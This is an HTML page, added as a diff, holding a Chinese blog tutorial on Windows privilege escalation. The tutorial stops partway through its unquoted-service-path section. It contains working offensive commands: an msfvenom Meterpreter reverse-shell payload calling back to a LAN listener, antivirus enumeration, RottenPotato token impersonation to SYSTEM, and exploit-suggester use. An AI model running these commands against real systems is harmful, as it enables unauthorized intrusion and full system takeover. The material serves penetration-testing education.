@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/1.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/1.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"onlycare.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="成殇Orz10x00 权限提升概述提权概述权限提升（privilege escalation）：攻击者通过安全漏洞把获取到的受限制的低权限用户突破限制，提权至高权限 的管理员用户，从而获得对整个系统得控制权。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权">
+<meta property="og:url" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="成殇のBlog">
+<meta property="og:description" content="成殇Orz10x00 权限提升概述提权概述权限提升（privilege escalation）：攻击者通过安全漏洞把获取到的受限制的低权限用户突破限制，提权至高权限 的管理员用户，从而获得对整个系统得控制权。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/1.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/2.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/3.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/4.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/5.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/6.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/7.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/8.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/9.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/10.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/11.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/12.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/13.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/14.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/15.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/16.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/17.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/18.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/19.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/20.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/21.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/22.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/23.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/24.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/25.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/26.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/27.png">
+<meta property="og:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/28.png">
+<meta property="article:published_time" content="2021-03-22T14:13:06.000Z">
+<meta property="article:modified_time" content="2021-03-22T15:41:54.735Z">
+<meta property="article:author" content="成殇Orz1">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/1.png">
+
+<link rel="canonical" href="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Windows提权 | 成殇のBlog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">成殇のBlog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/onlycare" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://onlycare.github.io/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/2.png">
+      <meta itemprop="name" content="成殇Orz1">
+      <meta itemprop="description" content="菜鸡一枚">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="成殇のBlog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows提权
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-22 22:13:06 / 修改时间：23:41:54" itemprop="dateCreated datePublished" datetime="2021-03-22T22:13:06+08:00">2021-03-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-权限提升概述"><a href="#0x00-权限提升概述" class="headerlink" title="0x00 权限提升概述"></a>0x00 权限提升概述</h3><h5 id="提权概述"><a href="#提权概述" class="headerlink" title="提权概述"></a>提权概述</h5><p>权限提升（privilege escalation）：攻击者通过安全漏洞把获取到的受限制的低权限用户突破限制，提权至高权限 的管理员用户，从而获得对整个系统得控制权。 </p>
+<span id="more"></span>
+
+<h5 id="Windows系统内置用户和组"><a href="#Windows系统内置用户和组" class="headerlink" title="Windows系统内置用户和组"></a>Windows系统内置用户和组</h5><p>内置用户：</p>
+<ul>
+<li><p>Administrator：系统管理员账户，拥有完全的控制权限</p>
+</li>
+<li><p>Guest：来宾账户，供访问共享资源的网络用户使用，仅有最基本的权限，默认被禁用</p>
+</li>
+</ul>
+<p>内置用户组：</p>
+<ul>
+<li><p>Administrators：管理员组</p>
+</li>
+<li><p>Users：新建用的默认所属的组</p>
+</li>
+<li><p>Guests：来宾组，权限最低</p>
+</li>
+</ul>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows：<span class="keyword">user</span> <span class="title">--&gt; administrator</span></span><br><span class="line">Linux：<span class="keyword">user</span> <span class="title">--&gt; root</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="提权分类"><a href="#提权分类" class="headerlink" title="提权分类"></a>提权分类</h5><p>本地提权：在一个低权限用户下，通过一些条件（应用程序漏洞、系统漏洞等）直接提升到系统最高权限。 </p>
+<p>远程提权：攻击者通过漏洞利用程序直接获取远程服务器的权限。</p>
+<p>纵向提权：低权限角色获得高权限角色的权限。</p>
+<p>横向提权：获取同级别角色的权限。</p>
+<h5 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h5><ul>
+<li>拥有Webshell，普通用户权限 </li>
+<li>拥有某些软件的账号密码 </li>
+<li>本地或远程服务器上存在漏洞 </li>
+<li>拥有漏洞利用工具代码</li>
+</ul>
+<h5 id="Windows提权思路-•"><a href="#Windows提权思路-•" class="headerlink" title="Windows提权思路 •"></a>Windows提权思路 •</h5><ul>
+<li>前期信息收集 </li>
+<li>Meterpreter提权 </li>
+<li>Windows系统内核漏洞 </li>
+<li>Windows服务漏洞 </li>
+<li>Windwos注册表</li>
+</ul>
+<h3 id="0x01-Windows提权信息收集"><a href="#0x01-Windows提权信息收集" class="headerlink" title="0x01 Windows提权信息收集"></a>0x01 Windows提权信息收集</h3><h5 id="获取meterpreter"><a href="#获取meterpreter" class="headerlink" title="获取meterpreter"></a>获取meterpreter</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="literal">-p</span> windows/meterpreter/reverse_tcp lhost=<span class="number">192.168</span>.<span class="number">31.246</span> lport=<span class="number">8882</span> <span class="operator">-f</span> exe <span class="literal">-o</span> xx.exe <span class="literal">-e</span></span><br><span class="line">x86/shikata_ga_nai <span class="literal">-i</span> <span class="number">8</span></span><br><span class="line"></span><br><span class="line">handler <span class="literal">-p</span> windows/meterpreter/reverse_tcp <span class="literal">-H</span> <span class="number">192.168</span>.<span class="number">31.246</span> <span class="literal">-P</span> <span class="number">8882</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/1.png"></p>
+<h5 id="WMIC信息收集"><a href="#WMIC信息收集" class="headerlink" title="WMIC信息收集"></a>WMIC信息收集</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取杀软名：</span></span><br><span class="line">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br><span class="line"><span class="comment">#获取杀软名和安装路径：</span></span><br><span class="line">WMIC /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe</span><br><span class="line">wmic <span class="built_in">group</span>				<span class="comment">#组帐户管理。</span></span><br><span class="line">wmic os					<span class="comment">#已安装操作系统的管理。</span></span><br><span class="line">wmic <span class="keyword">process</span>				<span class="comment">#进程管理</span></span><br><span class="line">wmic service				<span class="comment">#服务应用程序管理。</span></span><br><span class="line">wmic useraccount			<span class="comment">#用户帐户管理。</span></span><br><span class="line">wmic startup				<span class="comment">#当用户登录到计算机系统时自动运行的命令的管理。</span></span><br><span class="line">wmic nic				<span class="comment">#网络接口控制器(NIC)管理</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="wmic信息提取脚本：wmic-info-bat"><a href="#wmic信息提取脚本：wmic-info-bat" class="headerlink" title="wmic信息提取脚本：wmic_info.bat"></a>wmic信息提取脚本：wmic_info.bat</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/2.png"></p>
+<h5 id="SC信息收集"><a href="#SC信息收集" class="headerlink" title="SC信息收集"></a>SC信息收集</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> query state= all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/3.png"></p>
+<h5 id="自动信息收集"><a href="#自动信息收集" class="headerlink" title="自动信息收集"></a>自动信息收集</h5><h6 id="Host-Information-Gathering-Script：HIGS-bat"><a href="#Host-Information-Gathering-Script：HIGS-bat" class="headerlink" title="Host Information Gathering Script：HIGS.bat"></a>Host Information Gathering Script：HIGS.bat</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https</span>://github.com/myh<span class="number">0</span>st/scripts/blob/master/Windows%E<span class="number">4</span>%B<span class="number">8</span>%<span class="number">8</span>B%E<span class="number">4</span>%BF%A<span class="number">1</span>%E<span class="number">6</span>%<span class="number">81</span>%AF%E<span class="number">6</span>%<span class="number">9</span> <span class="number">4</span>%B<span class="number">6</span>%E<span class="number">9</span>%<span class="number">9</span>B%<span class="number">86</span>/HIGS.bat</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/4.png"></p>
+<h6 id="privilege-escalation-awesome-scripts：winPEAS-bat"><a href="#privilege-escalation-awesome-scripts：winPEAS-bat" class="headerlink" title="privilege-escalation-awesome-scripts：winPEAS.bat"></a>privilege-escalation-awesome-scripts：winPEAS.bat</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/carlospolop/</span>privilege-escalation-awesome-scriptssuite<span class="regexp">/blob/m</span>aster<span class="regexp">/winPEAS/</span>winPEASbat/winPEAS.bat</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/M4ximuss/</span>Powerless</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="提权工具脚本"><a href="#提权工具脚本" class="headerlink" title="提权工具脚本"></a>提权工具脚本</h5><h6 id="RottenPotato：-将服务帐户本地提权至SYSTEM"><a href="#RottenPotato：-将服务帐户本地提权至SYSTEM" class="headerlink" title="RottenPotato： 将服务帐户本地提权至SYSTEM"></a>RottenPotato： 将服务帐户本地提权至SYSTEM</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_token –u</span><br><span class="line">upload /root/rottenpotato.exe .</span><br><span class="line">execute <span class="literal">-Hc</span> <span class="operator">-f</span> rottenpotato.exe</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/5.png">)</p>
+<p>基于RottenPotato二次开发的软件：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Origin Potato : https:<span class="regexp">//gi</span>thub.com<span class="regexp">/foxglovesec/</span>Potato </span><br><span class="line"></span><br><span class="line">RottenPotato &amp; JuicyPotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ohpe/</span>juicy-potato </span><br><span class="line"></span><br><span class="line">RoguePotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/antonioCoco/</span>RoguePotato </span><br><span class="line"></span><br><span class="line">SweetPotato: https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CCob/</span>SweetPotato</span><br></pre></td></tr></table></figure>
+
+<h6 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/6.png"></p>
+<h6 id="Getsystem"><a href="#Getsystem" class="headerlink" title="Getsystem"></a>Getsystem</h6><p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/7.png"></p>
+<h3 id="0x02-Windows内核漏洞提权"><a href="#0x02-Windows内核漏洞提权" class="headerlink" title="0x02 Windows内核漏洞提权"></a>0x02 Windows内核漏洞提权</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#检查Windows版本是否有任何已知的漏洞：</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version“</span></span><br><span class="line"><span class="string">wmic qfe get Caption,Description,HotFixID,InstalledOn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出所有补丁：</span></span><br><span class="line"><span class="string">powershell -c &quot;</span><span class="built_in">Get-WmiObject</span> <span class="literal">-query</span> <span class="string">&#x27;select * from win32_quickfixengineering&#x27;</span> | <span class="keyword">foreach</span> &#123;<span class="variable">$_</span>.hotfixid&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出安全更新补丁：</span></span><br><span class="line"><span class="string">powershell -c &quot;</span><span class="built_in">Get-Hotfix</span> <span class="literal">-description</span> <span class="string">&#x27;Security update&#x27;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="windows-kernel-exploits-Windows平台提权漏洞集合"><a href="#windows-kernel-exploits-Windows平台提权漏洞集合" class="headerlink" title="windows-kernel-exploits(Windows平台提权漏洞集合):"></a>windows-kernel-exploits(Windows平台提权漏洞集合):</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SecWiki/</span>windows-kernel-exploits</span><br></pre></td></tr></table></figure>
+
+<h6 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> SESSION </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/8.png"></p>
+<h4 id="0x03-Windows系统服务漏洞"><a href="#0x03-Windows系统服务漏洞" class="headerlink" title="0x03  Windows系统服务漏洞"></a>0x03  Windows系统服务漏洞</h4><h5 id="可信任服务路径"><a href="#可信任服务路径" class="headerlink" title="可信任服务路径"></a>可信任服务路径</h5><p>可信任服务路径：存在缺陷的服务程序利用属于可执行文件的文件/文件夹权限， Windows服务通常都是以System权限运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候 也会以系统权限进行解析。如果我们能利用这一特性，就有机会进行权限提升。</p>
+<p>例如：</p>
+<p>C:\Program Files (x86)\Windows Folder\Common Folder\Folder.exe </p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="string">\Program.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows</span> Folder<span class="string">\Common.exe</span> </span><br><span class="line"></span><br><span class="line">C:<span class="string">\Program</span> Files (x86)<span class="string">\Windows</span> Folder<span class="string">\Common</span> Folder<span class="string">\Folder.exe</span></span><br></pre></td></tr></table></figure>
+
+<p>Windows在寻找这个文件的时候，碰见空格会先找寻Program.exe这个文件，如果当前文件下没有Program.exe，则会继续向下走到第二个目录，碰见空格，又执行Windows.exe，以此类推，知道执行到Folder.exe。</p>
+<p>所以，我们可以通过查找系统服务文件中存在的非引用路径，如果一个服务调用可执行文件，没有正确处理引用的全路径名， 则可利用此漏洞。</p>
+<ol>
+<li><h6 id="检查目标主机是否可能存在漏洞："><a href="#检查目标主机是否可能存在漏洞：" class="headerlink" title="检查目标主机是否可能存在漏洞："></a>检查目标主机是否可能存在漏洞：</h6></li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode|findstr /i <span class="string">&quot;Auto&quot;</span> |findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span></span><br><span class="line">|findstr/i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/22/Windows%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/9.png"></p>
+<ol start="2">
+<li><h6 id="检查对有漏洞目录是否有写入权限"><a href="#检查对有漏洞目录是否有写入权限" class="headerlink" title="检查对有漏洞目录是否有写入权限"></a>检查对有漏洞目录是否有写入权限</h6></li>
+</ol>
